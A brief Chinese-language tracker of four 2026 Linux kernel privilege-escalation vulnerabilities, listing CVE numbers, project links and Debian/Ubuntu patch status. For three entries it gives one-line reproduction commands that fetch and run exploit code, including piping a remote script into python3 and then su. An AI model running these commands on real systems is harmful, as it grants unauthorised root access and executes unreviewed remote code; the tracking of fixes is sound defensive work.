# Linux 重大漏洞

## Copy Fail

官网：[copy.fail](https://copy.fail)

复现：`curl https://copy.fail/exp | python3 && su`

CVE：CVE-2026-31431

发行版修复方式：

- Debian：通过内核更新修复，<https://security-tracker.debian.org/tracker/CVE-2026-31431>
- Ubuntu：通过 kmod 分发 modprobe 黑名单，见 <https://ubuntu.com/security/CVE-2026-31431>, <https://ubuntu.com/blog/copy-fail-vulnerability-fixes-available>

## Dirty Frag

官网：[V4bel/dirtyfrag](https://github.com/V4bel/dirtyfrag)

复现：`git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp`

CVE: CVE-2026-43284 (xfrm) 和 CVE-2026-43500 (RxRPC)

相关：[copy fail 2: electric boogaloo](https://afflicted.sh/blog/posts/copy-fail-2.html)

发行版修复方式：

- Debian：通过内核更新修复，<https://security-tracker.debian.org/tracker/CVE-2026-43284> 和 <https://security-tracker.debian.org/tracker/CVE-2026-43500>
- Ubuntu：尚未修复，见 <https://ubuntu.com/security/CVE-2026-43284>, <https://ubuntu.com/blog/dirty-frag-linux-vulnerability-fixes-available>

## Fragnesia

官网：[v12-security/pocs](https://github.com/v12-security/pocs/tree/main/fragnesia)

复现：`git clone https://github.com/v12-security/pocs.git && cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp`

CVE：CVE-2026-46300

发行版修复方式：

- Debian：见 通过内核更新修复，<https://security-tracker.debian.org/tracker/CVE-2026-46300>
- Ubuntu：见 <https://ubuntu.com/security/CVE-2026-46300>

## ssh-keysign-pwn

官网：[0xdeadbeefnetwork/ssh-keysign-pwn](https://github.com/0xdeadbeefnetwork/ssh-keysign-pwn)

CVE：CVE-2026-46333

发行版修复方式：

- Debian：通过内核更新修复，见 <https://security-tracker.debian.org/tracker/CVE-2026-46333>
